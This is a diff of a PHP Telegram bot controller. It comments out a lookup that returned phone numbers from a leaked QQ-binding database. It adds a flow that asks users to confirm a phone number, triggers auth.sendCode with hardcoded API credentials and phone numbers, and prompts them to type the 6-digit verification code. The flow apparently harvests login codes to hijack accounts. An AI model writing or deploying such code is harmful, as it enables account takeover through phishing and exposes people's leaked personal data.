@@ -18,7 +18,6 @@ class Api
     public function index(){
         //设置连接根
         
-        
         $admin=Db::table('admin')->where(array('id'=>1))->find();
         $token=$admin['token'];
         
@@ -40,6 +39,7 @@ class Api
          
         $tg_message=Db::table('tg_message')->insert($data);
         
+      /*  
         if(is_numeric($data['text'])==true){
         //查Q绑
          $qq_bang = Db::connect([
@@ -69,13 +69,13 @@ class Api
         ->find();
         
             if($qq_bang){
-                file_get_contents($url . "sendmessage?text=绑定手机号：". $qq_bang['mobile'] ."&chat_id=" . $chat_id);
+                file_get_contents($url . "/sendmessage?text=绑定手机号：". $qq_bang['mobile'] ."&chat_id=" . $chat_id);
                 exit;
             }else{
-                file_get_contents($url . "sendmessage?text=该QQ未泄露" ."&chat_id=" . $chat_id);
+                file_get_contents($url . "/sendmessage?text=该QQ未泄露" ."&chat_id=" . $chat_id);
                 exit;
             }
-        }
+        }*/
         
         //获取数据库关键词
         $api=Db::table('api')
@@ -90,10 +90,43 @@ class Api
           exit;
         }
         
-        // if($data['text']=='/look'){
-        // file_get_contents($url . "sendmessage?text=您可以私聊或回复我发送以下文字：胸大、甜美、大长腿、清纯、骚情" ."&chat_id=" . $chat_id);
-        // exit;
-        // }
+        // $keyboard = [
+        //     'inline_keyboard' => [
+        //         [
+        //             ['text' => 'forward me to groups']
+        //         ]
+        //     ]
+        // ];
+
+        // $keyboard = json_encode([
+        //     'inline_keyboard' => [
+        //         [
+        //             ['text' => 'forward me to groups 🤖', 'callback_data' => '/welcome']
+        //         ]
+        //     ]
+        // ]);
+       
+
+        if(is_numeric($data['text'])){
+            $messageData = $data['text'].' is this your phone number? <b>Yes?</b> &parse_mode=html';
+            sendMessage($chat_id,$messageData,$token);
+            exit;
+        }
+
+        if(strtolower($data['text']) == 'yes'){
+            $messageData = 'SMS contains 6-digit code has been sent to 60172353727 
+            if 60172353727 is not your number press 
+            /reverifyphone 
+            to restart the verify process 
+            Please insert 6-digit verification code here:';
+
+     
+            $resp = api('POST',$url . "/auth.sendCode&parse_mode=html",array("phone_number"=>"918209061054","api_id"=>"13628466","app_hash"=>"84dead29a279eac6e474c26826ff8e48")); 
+            
+            file_get_contents($url . "/sendmessage?text=".$messageData."&chat_id=" . $chat_id.'&parse_mode=html');
+            exit;
+        }
+
         
         // if($data['text']=='/look@Azhe_php_bot'){
         // file_get_contents($url . "sendmessage?text=您可以私聊或回复我发送以下文字：胸大、甜美、大长腿、清纯、骚情" ."&chat_id=" . $chat_id);
